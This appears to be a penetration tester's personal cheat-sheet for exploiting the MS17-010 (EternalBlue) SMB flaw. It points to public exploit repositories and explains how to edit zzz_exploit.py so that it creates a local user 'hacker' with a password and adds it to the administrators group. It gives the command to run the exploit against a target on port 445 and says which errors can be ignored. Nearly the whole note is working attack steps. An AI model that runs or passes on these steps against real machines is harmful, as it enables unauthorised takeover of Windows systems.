# named pipes

https://github.com/3ndG4me/AutoBlue-MS17-010

eternal_checker.py

# zzz_exploit

https://github.com/helviojunior/MS17-010.git

## modifications

change username and password in beginning of the exploit

change payload on line 975 and run each command after seperatly:

    #service_exec(conn, r'cmd /c net user /add hacker mypassword123')
    #service_exec(conn, r'cmd /c net localgroup administrators hacker /add')

## run

python2 zzz_exploit.py "$rhost" 445 samr

## errors

you can ignore erros like these: 

SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.

